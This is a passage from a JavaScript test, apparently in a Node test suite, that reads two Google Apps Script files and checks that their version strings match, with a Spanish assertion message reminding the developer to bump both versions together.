  const app = fs.readFileSync(path.join(__dirname, "..", "apps-script", "App.html"), "utf8").match(/var VERSION_APP = '([^']+)'/)[1];
  const srv = fs.readFileSync(path.join(__dirname, "..", "apps-script", "Servidor.gs"), "utf8").match(/var VERSION = '([^']+)'/)[1];
  assert.equal(app, srv, "sube las dos juntas");
});
